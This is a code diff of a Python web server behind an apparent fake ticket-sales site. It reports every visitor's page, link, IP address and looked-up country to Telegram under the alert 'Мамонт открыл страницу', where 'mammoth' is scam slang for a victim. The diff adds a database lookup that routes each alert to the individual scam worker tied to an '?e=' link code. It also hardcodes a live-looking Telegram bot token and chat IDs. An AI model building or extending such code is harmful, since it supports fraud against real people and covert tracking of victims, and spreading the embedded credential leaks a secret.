@@ -5,21 +5,86 @@ import os
 import sys
 from urllib.parse import urlparse, unquote
 import requests
+import sqlite3
 
 # Настройки сервера
 PORT = 80  # Стандартный HTTP порт
 DIRECTORY = "events-art.com"  # Папка з сайтом
 
-def send_telegram_log(page, link, ip, country=""):
+# --- Country code to full name mapping ---
+COUNTRY_NAMES = {
+    'UA': 'Ukraine',
+    'RU': 'Russia',
+    'PL': 'Poland',
+    'DE': 'Germany',
+    'FR': 'France',
+    'IT': 'Italy',
+    'ES': 'Spain',
+    'GB': 'United Kingdom',
+    'US': 'United States',
+    'NL': 'Netherlands',
+    'TR': 'Turkey',
+    'KZ': 'Kazakhstan',
+    'BY': 'Belarus',
+    'LT': 'Lithuania',
+    'LV': 'Latvia',
+    'EE': 'Estonia',
+    'CZ': 'Czech Republic',
+    'SK': 'Slovakia',
+    'RO': 'Romania',
+    'MD': 'Moldova',
+    'GE': 'Georgia',
+    'AM': 'Armenia',
+    'AZ': 'Azerbaijan',
+    'BG': 'Bulgaria',
+    'GR': 'Greece',
+    'HU': 'Hungary',
+    'FI': 'Finland',
+    'SE': 'Sweden',
+    'NO': 'Norway',
+    'DK': 'Denmark',
+    'BE': 'Belgium',
+    'CH': 'Switzerland',
+    'AT': 'Austria',
+    'IE': 'Ireland',
+    'PT': 'Portugal',
+    'HR': 'Croatia',
+    'RS': 'Serbia',
+    'SI': 'Slovenia',
+    'BA': 'Bosnia and Herzegovina',
+    'ME': 'Montenegro',
+    'MK': 'North Macedonia',
+    'AL': 'Albania',
+    'LU': 'Luxembourg',
+    'LI': 'Liechtenstein',
+    'IS': 'Iceland',
+    'CA': 'Canada',
+    'AU': 'Australia',
+    'NZ': 'New Zealand',
+    # ... додайте інші країни за потреби ...
+}
+
+def send_telegram_log(page, link, ip, country="", extra_user_id=None):
     BOT_TOKEN = "5619487724:AAFeBptlX1aJ9IEAFLMUXN3JZBImJ35quWk"  # токен з main.py
     GROUP_ID = -828011200  # group id з main.py
     ADMIN_ID = 7973971109   # ваш admin id (залишаємо той самий)
+    # Визначаємо країну за IP, якщо не передано
+    if not country:
+        try:
+            resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=2)
+            if resp.status_code == 200:
+                data = resp.json()
+                country = data.get("country", "")
+        except Exception:
+            country = ""
+    # Перетворюємо код країни на повну назву
+    country_full = COUNTRY_NAMES.get(country, country)
     msg = (
         f"⚠️ Мамонт открыл страницу\n"
         f"📄 Страница: {page}\n"
         f"🔗 Ссылка: {link}\n"
         f"🌍 IP: {ip}\n"
-        f"🌏 Страна: {country}"
+        f"🌏 Страна: {country_full}"
     )
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data_group = {"chat_id": GROUP_ID, "text": msg}
@@ -27,6 +92,9 @@ def send_telegram_log(page, link, ip, country=""):
     try:
         requests.post(url, data=data_group, timeout=2)
         requests.post(url, data=data_admin, timeout=2)
+        if extra_user_id:
+            data_user = {"chat_id": extra_user_id, "text": msg}
+            requests.post(url, data=data_user, timeout=2)
     except Exception as e:
         print(f"❌ Не вдалося надіслати лог у Telegram: {e}")
 
@@ -61,7 +129,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             if os.path.exists(ticket_path):
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/pdf')
-                self.send_header('Content-Disposition', f'inline; filename="{filename}"')
+                self.send_header('Content-Disposition', f'inline; filename=\"{filename}\"')
                 self.end_headers()
                 with open(ticket_path, 'rb') as f:
                     self.wfile.write(f.read())
@@ -77,6 +145,27 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         # Якщо це ресурс — не логувати
         if any(ext in orig_path for ext in skip_ext) or any(d in orig_path for d in skip_dirs):
             return super().do_GET()
+        # --- NEW: If ?e=code in URL, try to find event creator ---
+        extra_user_id = None
+        parsed = urlparse(self.path)
+        if parsed.query:
+            from urllib.parse import parse_qs
+            qs = parse_qs(parsed.query)
+            event_code = None
+            if 'e' in qs:
+                event_code = qs['e'][0]
+            if event_code:
+                try:
+                    db = sqlite3.connect('users.db')
+                    cur = db.cursor()
+                    cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (event_code,))
+                    row = cur.fetchone()
+                    if row:
+                        extra_user_id = row[0]
+                    db.close()
+                except Exception as e:
+                    print(f"[DB] Error fetching event creator: {e}")
+        # --- END NEW ---
         # Нормалізуємо шлях для унікальності
         norm_path = orig_path
         if norm_path.endswith('/index.html'):
@@ -87,6 +176,16 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         should_log = (
             norm_path == '/' or norm_path.endswith('/') or norm_path.endswith('.html')
         )
+        # --- LOGIC CHANGE: always log to event creator if ?e=code, regardless of should_log ---
+        if extra_user_id:
+            print(f"📝 Логуємо відкриття сторінки для event creator: {norm_path}")
+            send_telegram_log(
+                page=norm_path,
+                link=self.path,
+                ip=self.client_address[0],
+                extra_user_id=extra_user_id
+            )
+        # Група та адмін — як і раніше, тільки для основних сторінок
         if should_log:
             if not hasattr(self.server, 'logged_paths'):
                 self.server.logged_paths = set()
